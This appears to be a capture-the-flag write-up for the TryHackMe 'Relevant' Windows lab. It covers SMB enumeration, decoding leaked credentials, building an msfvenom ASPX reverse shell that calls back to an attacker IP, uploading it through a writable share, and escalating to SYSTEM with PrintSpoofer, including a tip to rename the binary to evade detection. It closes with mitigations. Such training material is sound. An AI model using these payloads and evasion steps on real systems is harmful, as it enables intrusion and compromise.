# TryHackMe - [Relevant](https://tryhackme.com/room/relevant) Write-Up

"You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days."

Read over the scope of the work.

From the scope we can see that we are given permission to use any tools required.

We must report ALL vulnerabilities and submit the 2 flags (user and root).

## Task 1: Pre-Engagement Briefing

Since this is a blackbox, we will be starting with no information.

Let's make a directory for this CTF and open a terminal in it as root.

We can start by running an nmap on the device and outputting it (we will want to save it to show the company).

```
nmap 10.10.212.88 -A -p- -vv -T4 -oA nmap
```

I outputted it to all formats, because I am unsure what their preference is.

The scan looks like it will take awhile, so let's brainstorm some of these ports we see listed so far.

* 80 (http)
* 139 (SMB)
* 3389 (RDP)
* 135 (msrpc)
* 445 (SMB)
* 49663 (http)

After visiting the site and finding nothing, we will move on to what appeared to be a smb server.

Let's go and see first if we can enumerate.

```
smbmap -H 10.10.212.88
[!] Authentication error on 10.10.212.88
nbtscan 10.10.212.88
```

Let's try using smbclient with anonymous login (no password), because neither smbmap or nbtscan brought anything back.

```
smbclient -L 10.10.212.88                                                        1 ⨯
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

We see another port (49667) appear in the nmap.

While we wait on the nmap, let's do some gobuster on the site because all we found was the default Microsoft IIS page.

```
gobuster dir -u http://10.10.212.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
```

Unfortunately we weren't able to find anything with gobuster.

Let's try to login to the smb shares without a password.

```
smbclient \\\\10.10.212.88\\c$                                                   1 ⨯

Enter WORKGROUP\root's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Run through all the shares with smbclient

Finally, we get a hit on nt4wrksv with anonymous login.

```
smbclient \\\\10.10.212.88\\nt4wrksv 
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4937629 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```

Even better, we find a passwords.txt that we can get.

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

They appear to be encoded in base64, so let's decode them.

I used base64 -d, but there are plenty of other good options for this.

```
Bill - Juw4nnaM4n420696969!$$$
Bob - !P@$$W0rD!123
```

We finally get our nmap back.

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 18:24 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:24
Completed NSE at 18:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:24
Completed NSE at 18:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:24
Completed NSE at 18:24, 0.00s elapsed
Initiating Ping Scan at 18:24
Scanning 10.10.212.88 [4 ports]
Completed Ping Scan at 18:24, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:24
Completed Parallel DNS resolution of 1 host. at 18:24, 0.10s elapsed
Initiating SYN Stealth Scan at 18:24
Scanning 10.10.212.88 [65535 ports]
Discovered open port 139/tcp on 10.10.212.88
Discovered open port 3389/tcp on 10.10.212.88
Discovered open port 135/tcp on 10.10.212.88
Discovered open port 445/tcp on 10.10.212.88
Discovered open port 80/tcp on 10.10.212.88
Discovered open port 49663/tcp on 10.10.212.88
SYN Stealth Scan Timing: About 11.64% done; ETC: 18:29 (0:03:55 remaining)
SYN Stealth Scan Timing: About 21.01% done; ETC: 18:29 (0:04:12 remaining)
Increasing send delay for 10.10.212.88 from 0 to 5 due to 18 out of 59 dropped probes since last increase.
SYN Stealth Scan Timing: About 21.15% done; ETC: 18:32 (0:06:02 remaining)
Increasing send delay for 10.10.212.88 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.212.88 from 10 to 20 due to 11 out of 11 dropped probes since last increase.
SYN Stealth Scan Timing: About 21.40% done; ETC: 18:34 (0:07:46 remaining)
SYN Stealth Scan Timing: About 22.45% done; ETC: 18:36 (0:09:02 remaining)
SYN Stealth Scan Timing: About 23.42% done; ETC: 18:37 (0:10:12 remaining)
SYN Stealth Scan Timing: About 24.34% done; ETC: 18:39 (0:11:14 remaining)
SYN Stealth Scan Timing: About 25.26% done; ETC: 18:40 (0:12:11 remaining)
SYN Stealth Scan Timing: About 26.14% done; ETC: 18:42 (0:13:02 remaining)
SYN Stealth Scan Timing: About 27.19% done; ETC: 18:43 (0:13:58 remaining)
SYN Stealth Scan Timing: About 28.47% done; ETC: 18:45 (0:14:59 remaining)
SYN Stealth Scan Timing: About 30.42% done; ETC: 18:47 (0:16:03 remaining)
SYN Stealth Scan Timing: About 33.73% done; ETC: 18:50 (0:17:13 remaining)
Discovered open port 49667/tcp on 10.10.212.88
SYN Stealth Scan Timing: About 54.47% done; ETC: 18:59 (0:15:54 remaining)
SYN Stealth Scan Timing: About 61.57% done; ETC: 19:01 (0:14:09 remaining)
SYN Stealth Scan Timing: About 68.82% done; ETC: 19:03 (0:12:17 remaining)
SYN Stealth Scan Timing: About 74.81% done; ETC: 19:05 (0:10:18 remaining)
SYN Stealth Scan Timing: About 80.21% done; ETC: 19:06 (0:08:13 remaining)
SYN Stealth Scan Timing: About 85.43% done; ETC: 19:06 (0:06:07 remaining)
SYN Stealth Scan Timing: About 90.55% done; ETC: 19:07 (0:04:00 remaining)
Discovered open port 49669/tcp on 10.10.212.88
SYN Stealth Scan Timing: About 95.62% done; ETC: 19:07 (0:01:52 remaining)
Completed SYN Stealth Scan at 19:07, 2592.45s elapsed (65535 total ports)
Initiating Service scan at 19:07
Scanning 8 services on 10.10.212.88
Completed Service scan at 19:08, 60.50s elapsed (8 services on 1 host)
Initiating OS detection (try #1) against 10.10.212.88
Retrying OS detection (try #2) against 10.10.212.88
Initiating Traceroute at 19:08
Completed Traceroute at 19:08, 3.03s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 19:08
Completed Parallel DNS resolution of 2 hosts. at 19:08, 0.14s elapsed
NSE: Script scanning 10.10.212.88.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:08
NSE Timing: About 99.91% done; ETC: 19:09 (0:00:00 remaining)
Completed NSE at 19:09, 40.77s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 1.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Nmap scan report for 10.10.212.88
Host is up, received echo-reply ttl 125 (0.11s latency).
Scanned at 2021-03-17 18:24:35 EDT for 2703s
Not shown: 65527 filtered ports
Reason: 65527 no-responses
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-03-17T23:09:00+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-03-16T22:14:04
| Not valid after:  2021-09-15T22:14:04
| MD5:   dc9a 9254 c458 58ab 9e15 68cc 558e 4ffc
| SHA-1: f882 d5ef 1cd5 0310 0c64 b399 080b 5973 bf67 a313
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQXLgQX8e66axAPrjkpFUzWzANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMTAzMTYyMjE0MDRaFw0yMTA5MTUyMjE0
| MDRaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEArrcJLuP3X0BimgciEFvDt94VYpDvVi6gwe7XtLyLS528+JHnM6eI
| GpzXgag45Q0QR7c2blCImd4Wu/vR2LfDONFbSd01JsaNdm5tTdU8nOwTIlMtpAqX
| 1S08QVDOwfDrSRc3ezHqnCm0XQjwGWZ4/Wox3h0zplEWpZv5Uk2QYEYdGceT+kM4
| IxmoIY31jW0BLCdQI6McaHGgMQi+0sQv9USOlbfNrcaLEHhOUxpS29RM0C3IBiFg
| I176EsEChgaYkBLpgN9sd18lnQg4tlW51nKusH9j3Y4Xlytx7ofClqHw8oonEis1
| RzPdg5GpBfR4FyamxDt9NWXkgQjOPE0GJwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAGr/fiRd+6KM
| PTMNjLzzg99bzwvfhpSswR9maG9qhVGLikh8YsahVsqm9SRBJSg+MDy92ceaJNkM
| iVYZSfHjPX57bzwoYm3SAoAVa+VszFCRdP8E7l1F9CFag2+9999DD9Hlm6XG9Hzw
| p7b75NHm65VijBM+qcnKpW72dYeUgznMHEEmSo9g4j+PjXbZUe6o9eB3ph1QruLY
| zIwdAo5Gk3olcvePrUbAjU0ed0xYNZZjGWDa1rWPzHf/3vWB92Pwt0tthAIhJe1A
| t66vvHoACOv66XAILKodUxZEnNdHRswsbQ6+bG2TXuOzy8LWj8MO+dpij8C6KHnm
| fkGMBY1kyV4=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-03-17T23:09:40+00:00; +2s from scanner time.
49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2016 (90%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=3/17%OT=80%CT=%CU=%PV=Y%DS=4%DC=T%G=N%TM=60528C32%P=x86_64-pc-linux-gnu)
SEQ(SP=FE%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=A)
OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M506NW8ST11%O6=M506ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M506NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.041 days (since Wed Mar 17 18:10:44 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m02s, deviation: 3h07m51s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 9775/tcp): CLEAN (Timeout)
|   Check 2 (port 37905/tcp): CLEAN (Timeout)
|   Check 3 (port 47610/udp): CLEAN (Timeout)
|   Check 4 (port 55088/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-17T16:09:01-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-17T23:09:03
|_  start_date: 2021-03-17T22:14:47

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   21.21 ms  10.6.0.1
2   ... 3
4   112.39 ms 10.10.212.88

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2704.03 seconds
           Raw packets sent: 133005 (5.856MB) | Rcvd: 2325 (168.249KB)
```

From the nmap, we can see that it is most likely a Microsoft Windows 2012/2016.

Let's try to RDP in with these credentials since we saw port 3389 open.

Unfortunately, I wasn't able to get in anywhere with these users and believe they may be irRELEVANT.

Let's run a vulnerability scanner with nmap now on the main ports that we found.

```
nmap 10.10.212.88 -p 80,135,139,445,3389 -vv -script vuln -oA nmap-vuln
```

If we don't find anything, we can run it on the other higher ports that we saw.

```
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```
We're in luck, it looks like the server is vulnerable to CVE-2017-0143.

When we search on [Exploit-DB](https://www.exploit-db.com/), we find 4 relevant exploits.

```
DOUBLEPULSAR - Payload Execution and Neutralization (Metasploit)
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)
```

We will not consider the last option, because it is for a Denial of Service which we do not want.

We could use [Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)](https://www.exploit-db.com/exploits/43970).

However, the room recommends manual exploitation so we're going to log back into the smb share and see if we can upload files using put.

I'm going to create a text file called put.txt to test this.

```
smbclient \\\\10.10.186.41\\nt4wrksv                                             1 ⨯
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> put put.txt
putting file put.txt as \put.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Mar 20 18:53:57 2021
  ..                                  D        0  Sat Mar 20 18:53:57 2021
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  put.txt                             A        0  Sat Mar 20 18:53:57 2021

                7735807 blocks of size 4096. 4949974 blocks available
```

Now that we see we have write permissions, lets check to see if we can navigate to this file in a browser, because we will need a way to execute our payload.

Let's see if the smb share is linked to port 49663 which we saw was http in our netscan by navigating to 10.10.212.88:49663/nt4wrksv/passwords.txt

### Success!! Now we found a way to get initial access.

* Let's create a msfvenom payload in our Relevant directory.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.40.191 LPORT=4444 -f aspx -o disc0ver.aspx    
```

* Let's open up a netcat listener (since they noted this could be done without metasploit).

```
rlwrap nc -lvnp 4444
```

I like to use rlwrap because it lets you use arrowkeys in the shell.

* Let's put the payload on the server through smb.

```
smb: \> put disc0ver.aspx
putting file disc0ver.aspx as \disc0ver.aspx (2.3 kb/s) (average 2.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Mar 20 19:04:36 2021
  ..                                  D        0  Sat Mar 20 19:04:36 2021
  disc0ver.aspx                       A     2722  Sat Mar 20 19:04:36 2021
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  put.txt                             A        0  Sat Mar 20 18:53:57 2021

                7735807 blocks of size 4096. 4947171 blocks available
```

* Finally, we can curl the shell to execute.

```
curl http://10.10.17.123:49663/nt4wrksv/dis0ver.aspx
```

### Win! we got initial access.

Let's find that user flag.

First using whoami, we see that we are iis apppool\defaultapppool

I navigated to root / and then checked the users.

```
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users

07/25/2020  02:03 PM    <DIR>          .
07/25/2020  02:03 PM    <DIR>          ..
07/25/2020  08:05 AM    <DIR>          .NET v4.5
07/25/2020  08:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  10:30 AM    <DIR>          Administrator
07/25/2020  02:03 PM    <DIR>          Bob
07/25/2020  07:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  20,274,839,552 bytes free
```

Checking Bob's desktop we see the (user.txt). Let's try to read it.

```
type user.txt
```

Great, we have access to the user flag without any escalation.

Let's check our privileges.

```
c:\Users\Bob\Desktop>whoami /all & REM could also do /priv for just the privileges
whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Awesome, we can see we have access to 3 privileges.

* SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
* SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
* SeCreateGlobalPrivilege       Create global objects                     Enabled

After some [research](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), I will be exploiting the vulnerability in SeImpersonatePrivilege which is possible because service accounts are required to run with elevated privileges using this.

We can use [Printspoofer](https://github.com/itm4n/PrintSpoofer) to exploit for escalation to system. Note, this binary will get flagged as a virus or malware.

Rename it to avoid detection to svcchost.exe.

Use put to get the exploit onto the server, navigate to the directory it was put in (C:\inetpub\wwwroot\nt4wrksv), and then execute it to spawn a SYSTEM cmd with the shell that we have.

```
svcchost.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening ...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Owned! Let's go get that flag.

```
more C:\users\administrator\desktop\root.txt
```

Found it on the Administrator desktop.

### Congratulations! You're done with the room!

## Mitigations

### Initial Access

* Disallow anonymous SMB login.
* Patch SMB vulnerability (CVE-2017-0143)

### Privilege Escalation

* Fix service account (iis apppool\defaultapppool) privileges (SeImpersonatePrivilege).

Feel free to reach out to me on [Twitter](https://twitter.com/R_G_9_n) if you have any questions.
